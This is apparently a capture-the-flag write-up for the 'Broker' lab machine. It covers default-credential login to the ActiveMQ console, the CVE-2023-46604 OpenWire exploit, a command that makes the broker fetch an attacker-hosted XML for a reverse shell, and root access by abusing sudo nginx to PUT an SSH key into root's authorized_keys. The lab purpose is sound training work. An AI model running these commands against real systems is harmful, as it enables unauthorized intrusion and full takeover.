# Broker — Easy — Linux

**Date:** 25 - August - 2026

---

## Tags

`#linux` `#web` `#activemq` `#openwire` `#deserialization` `#cve-2023-46604` `#unauthenticated-rce` `#default-creds` `#sudo` `#nginx` `#webdav-put` `#authorized-keys` `#privesc`

---

## What I Know

| Item       | Detail                                                                                  |
| ---------- | --------------------------------------------------------------------------------------- |
| Target     | 10.129.55.49 (host: Broker)                                                              |
| OS         | Ubuntu Linux                                                                             |
| Open ports | 22, 80, 1883, 5672, 8161, 42311, 61613, 61614, 61616                                     |
| Services   | OpenSSH 8.9p1 (22); nginx (80, basic-auth proxy); Apache ActiveMQ 5.15.15 (8161 + queues) |
| Foothold   | ActiveMQ 5.15.15 OpenWire deserialization (CVE-2023-46604) on 61616 -> shell as activemq  |
| User       | `activemq` (unauthenticated RCE) -> user.txt                                             |
| Privesc    | `sudo /usr/sbin/nginx` NOPASSWD -> rogue config -> WebDAV PUT root's authorized_keys      |
| Flags      | user.txt as activemq; root.txt as root                                                   |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.55.49
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1883/tcp  open  mqtt
5672/tcp  open  amqp
8161/tcp  open  patrol-snmp
42311/tcp open  unknown
61613/tcp open  unknown
61614/tcp open  unknown
61616/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 22.20 seconds
```

<img width="875" height="486" alt="image" src="https://github.com/user-attachments/assets/cb71498f-96e3-47ce-9e85-30c5d9ea3c3e" />

```
nmap -sC -sV -p22,80,1883,5672,8161,42311,61613,61614,61616 10.129.55.49
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-auth: basic realm=ActiveMQRealm     (HTTP/1.1 401 Unauthorized)
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open  mqtt                        (ActiveMQ MQTT transport)
5672/tcp  open  amqp?                       (ActiveMQ AMQP transport)
8161/tcp  open  http       Jetty 9.4.39.v20210325   (ActiveMQ web console, basic-auth)
|_http-auth: basic realm=ActiveMQRealm
42311/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ  (STOMP transport)
61614/tcp open  http       Jetty 9.4.39.v20210325   (ActiveMQ WS transport)
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15   (<-- exploit target)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# (verbose AMQP/STOMP fingerprint blocks trimmed for readability)
```

<img width="1731" height="1107" alt="image" src="https://github.com/user-attachments/assets/9f9fc864-1d69-4130-b700-8cf49c386805" />

**What each port tells me:**
- **Port 22 (SSH)** — OpenSSH 8.9p1 on Ubuntu. Open, but no credentials yet; a target to return to (and, as it turns out, the way back in as root).
- **Ports 80, 8161 (HTTP)** — nginx (80) and Jetty (8161), both behind basic-auth for `ActiveMQRealm`; 8161 is the ActiveMQ web console. Main starting point.
- **Port 1883 (MQTT)** — ActiveMQ's MQTT transport (lightweight pub/sub IoT protocol).
- **Port 5672 (AMQP)** — ActiveMQ's AMQP transport (Advanced Message Queuing Protocol).
- **Port 42311** — tcpwrapped (an ancillary ActiveMQ/RMI-style port); not directly actionable.
- **Port 61613 (STOMP)** — ActiveMQ's STOMP transport.
- **Port 61614 (WS)** — ActiveMQ's WebSocket transport (Jetty).
- **Port 61616 (OpenWire)** — ActiveMQ's native OpenWire transport, version 5.15.15. This is the CVE-2023-46604 target.

Everything points at one product: **Apache ActiveMQ 5.15.15**.

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: I could SSH in given valid creds
WHAT I AM GOING TO TRY: Set it aside
WHY: No credentials yet
RESULT: N/A
WHAT NEXT:
- Investigate the web app; dir-fuzz, stack, source review
```

```
OBSERVATION:
- The site (basic-auth, ActiveMQRealm) accepts default creds admin:admin
- Logged in, it's the Apache ActiveMQ console. "Manage ActiveMQ Broker" (/admin) leaks the
  version: 5.15.15
- Dir-fuzz and stack analysis: nothing else notable
WHAT IT TELLS ME:
- Research ActiveMQ 5.15.15 for known vulnerabilities; a leaked exact version is the lead
WHAT I AM GOING TO TRY:
- Look up ActiveMQ 5.15.15 CVEs
WHY:
- A precise version often maps to a public CVE for creds disclosure or RCE
RESULT:
- ActiveMQ 5.15.15 is vulnerable to CVE-2023-46604: an UNAUTHENTICATED remote code execution
  in the OpenWire transport (port 61616), CVSS 10.0. OpenWire fails to validate the throwable
  class type during unmarshalling, so the server fetches an attacker-hosted Spring XML
  (ClassPathXmlApplicationContext) and instantiates it, running arbitrary commands
- Used the duck-sec PoC
  (https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell): it serves a malicious
  XML and triggers the broker on 61616 to fetch+run it. Got a shell as user activemq and read
  user.txt
WHAT NEXT:
- Enumerate as activemq for a privesc path
```

<img width="2557" height="708" alt="image" src="https://github.com/user-attachments/assets/b70ffa4c-fd14-49a0-9b82-f489b43964c8" />

> The base domain which prompted a basic auth and admin:admin worked

<img width="2557" height="608" alt="image" src="https://github.com/user-attachments/assets/f545c22d-afe8-4310-8a05-1971de9946e7" />

> the home page which showed the existence of the application ActiveMQ

<img width="2555" height="785" alt="image" src="https://github.com/user-attachments/assets/2e7b90b8-33a9-47ac-8859-5f423d00c04b" />

> the "Manage ActiveMQ Broker" (/admin) page which showed the application was running version 5.15.15

<img width="1038" height="309" alt="image" src="https://github.com/user-attachments/assets/1cc1a82f-8fac-4b8a-9bd6-1f78e5c3803b" />

> Research showing that ActiveMQ 5.15.15 was vulnerable to CVE-2023-46604

<img width="1116" height="745" alt="image" src="https://github.com/user-attachments/assets/15a78d26-d424-4536-b2cb-b7e5a57181c9" />

> Downloading and understanding the exploit found in https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell

<img width="1225" height="692" alt="image" src="https://github.com/user-attachments/assets/2ab11c0f-f9e3-42d2-b04b-6b35b856b33e" />

> Abusing the vulnerability to gain access and trigger a reverse shell for a better interactive shell

<img width="1034" height="499" alt="image" src="https://github.com/user-attachments/assets/83b27c5a-9eac-420f-b988-24f198e0af29" />

> Catching the reverse shell and reading user.txt

```
OBSERVATION:
- sudo -l shows: activemq may run /usr/sbin/nginx as root with NO password
  ((ALL : ALL) NOPASSWD: /usr/sbin/nginx)
WHAT IT TELLS ME:
- Running nginx as root means I control a root-run web server: point its config wherever I
  like and it reads/writes with root privileges
WHAT I AM GOING TO TRY:
- Research abusing sudo nginx to gain root
WHY:
- If I can make root-nginx write files, I can drop an SSH key into root's authorized_keys
RESULT:
- Used https://github.com/DylanGrl/nginx_sudo_privesc. It works by writing a custom nginx
  config and loading it with sudo nginx -c; the config enables WebDAV so I can PUT files as
  root. The script generates an SSH keypair and PUTs the public key into
  /root/.ssh/authorized_keys
- exploit.sh must run from activemq's home (it references ./.ssh/id_rsa.pub; editable to an
  absolute path to run from anywhere)
- After running it, I SSH'd in as root with the generated private key and read root.txt
  (equivalently: ssh -i id_rsa root@localhost from the box itself)
```

<img width="1202" height="289" alt="image" src="https://github.com/user-attachments/assets/0b6435d8-0951-4d21-9e8c-5227baff981c" />

> Enumeration shows that user activemq can run /usr/bin/nginx as root without a password

<img width="1324" height="932" alt="image" src="https://github.com/user-attachments/assets/26d700e1-9b35-49b1-99e6-fd701fb2ad35" />

> The github page https://github.com/DylanGrl/nginx_sudo_privesc showing how to add an ssh key to authorized_keys and gain root

<img width="903" height="480" alt="image" src="https://github.com/user-attachments/assets/f991f916-efb2-4ab6-8351-f1deb4a4e34b" />

> Downloading the exploit from github and reading exploit.sh

<img width="1061" height="744" alt="image" src="https://github.com/user-attachments/assets/b29900c4-c5a7-47eb-801b-73c9a0ecf550" />

> The code of exploit.sh

<img width="1017" height="555" alt="image" src="https://github.com/user-attachments/assets/307f69f9-cff0-478a-861a-0ac317161f5f" />

> Moving exploit.sh to activemq's home (it generates .ssh/id_rsa.pub there; editable to an absolute path to run from anywhere)

<img width="996" height="1160" alt="image" src="https://github.com/user-attachments/assets/2d0b2d17-6bab-4273-a71b-8b1e60ea64a0" />

> Executing exploit.sh creates a private key

<img width="956" height="1161" alt="image" src="https://github.com/user-attachments/assets/52ec9b3b-283e-4c65-8510-f8ba0eb699e1" />

> copied the private key to my attack machine and fixed its permissions (or run ssh -i id_rsa root@localhost on the box itself)

<img width="1044" height="343" alt="image" src="https://github.com/user-attachments/assets/39da0240-5c1a-4196-93fe-6c522b5556e9" />

> Gained access as root using the private key

<img width="617" height="226" alt="image" src="https://github.com/user-attachments/assets/4d02b1ec-3b0c-4cb2-a6d4-ff72d1833a26" />

> Confirmed root and read root.txt

---

## Foothold

**How I got in:** Every open port pointed at **Apache ActiveMQ**. The basic-auth console accepted `admin:admin`, and `/admin` leaked the exact version **5.15.15**, which is vulnerable to **CVE-2023-46604**, an **unauthenticated** RCE in the **OpenWire** transport on port **61616**. Using the duck-sec PoC, the broker fetched an attacker-hosted Spring XML and executed it, giving a shell as the **activemq** user and user.txt.

**Command / exploit used:**

```
# confirm version at http://10.129.55.49:8161  (admin:admin) -> /admin shows 5.15.15

# CVE-2023-46604 (OpenWire deserialization, unauthenticated, port 61616)
git clone https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell
# the PoC serves a malicious ClassPathXmlApplicationContext XML and triggers the broker:
python3 exploit.py -i 10.129.55.49 -p 61616 -u http://<LHOST>/poc.xml
# poc.xml runs a reverse-shell command -> shell as activemq
nc -lnvp <LPORT>        # -> user.txt
```

**Why it worked:** ActiveMQ's OpenWire protocol unmarshalled a class reference without validating the throwable class type, so a crafted OpenWire packet made the broker instantiate an arbitrary Spring `ClassPathXmlApplicationContext` from an attacker-supplied URL, effectively "download and run this XML as code." It needs no authentication (the web console creds only confirmed the version), which is why it earned a CVSS 10.0. Code executes as the ActiveMQ service account, activemq.

---

## Privilege Escalation

**Path taken (activemq -> root):** `sudo -l` showed activemq may run **`/usr/sbin/nginx` as root with no password**. A root-run web server whose config you control can read and write anywhere as root, so I used the DylanGrl `nginx_sudo_privesc` exploit: it writes a custom nginx config, loads it with `sudo nginx -c`, and enables **WebDAV** so files can be **PUT** as root. The script generates an SSH keypair and PUTs the public key into **`/root/.ssh/authorized_keys`**, then I SSH in as **root** and read root.txt.

**Command / exploit used:**

```
sudo -l                     # (ALL : ALL) NOPASSWD: /usr/sbin/nginx

git clone https://github.com/DylanGrl/nginx_sudo_privesc
# run from activemq's home (references ./.ssh/id_rsa.pub)
cd /home/activemq && bash exploit.sh
# it: writes a rogue config (root user, dav_methods PUT), sudo nginx -c loads it,
# generates a keypair, and PUTs the pubkey to /root/.ssh/authorized_keys

# log in as root with the generated key
ssh -i id_rsa root@10.129.55.49        # (or ssh -i id_rsa root@localhost on the box) -> root.txt
```

**Why it worked:** Letting a user run `nginx` via sudo is dangerous because nginx's config (`-c`) fully controls what the root process does: with a rogue config you can make root-nginx serve the whole filesystem, or (as here) enable WebDAV `PUT` so you can write arbitrary files as root. Writing an attacker public key into `/root/.ssh/authorized_keys` converts that root file-write into a clean root SSH login. The escalation is a sudo misconfiguration, not an nginx bug.

---

### Reflection
1. **Foothold technique in one sentence:** Identified Apache ActiveMQ 5.15.15 from the console and exploited the unauthenticated OpenWire deserialization RCE (CVE-2023-46604) on port 61616 to get a shell as activemq.
2. **Privesc technique in one sentence:** Abused a `sudo /usr/sbin/nginx` NOPASSWD entry to load a rogue config that enabled WebDAV, PUT my SSH public key into root's authorized_keys, and logged in as root.
